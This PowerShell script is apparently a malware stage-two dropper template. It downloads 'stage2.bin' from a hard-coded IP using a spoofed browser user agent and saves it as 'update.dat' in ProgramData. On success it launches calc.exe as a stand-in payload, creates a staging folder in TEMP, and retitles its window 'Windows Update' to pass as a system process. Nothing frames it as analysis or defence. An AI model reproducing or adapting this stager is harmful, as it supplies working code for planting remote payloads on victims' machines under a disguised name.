
[CmdletBinding()]
param(
    [string]$FetchUrl = "http://198.51.100.139/stage2.bin",
    [string]$DropPath = "C:\ProgramData\update.dat",
    [int]$ConnectionTimeout = 68,
    [string]$BrowserAgent = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'
)
$ErrorActionPreference = "Stop"

function Invoke-Stage2Download {
    param(
        [string]$SourceUrl = "",
        [string]$DestinationPath = '',
        [int]$TimeoutSec = 45,
        [string]$UserAgent = "Mozilla/5.0"
    )

    Write-Verbose ("Requesting " + $SourceUrl)
    $ClientObject = New-Object System.Net.WebClient
    $ClientObject.Headers.Add("User-Agent", $UserAgent)
    $ClientObject.Headers.Add("X-Transfer-Timeout", [string]$TimeoutSec)
    $ClientObject.DownloadFile($SourceUrl, $DestinationPath)
    return (Test-Path -Path $DestinationPath)
}

Write-Verbose "Starting stage 2 transfer"
$FetchResult = Invoke-Stage2Download -SourceUrl $FetchUrl -DestinationPath $DropPath -TimeoutSec $ConnectionTimeout -UserAgent $BrowserAgent
if ($FetchResult) {
    Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
}

$null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force
$Host.UI.RawUI.WindowTitle = "Windows Update"
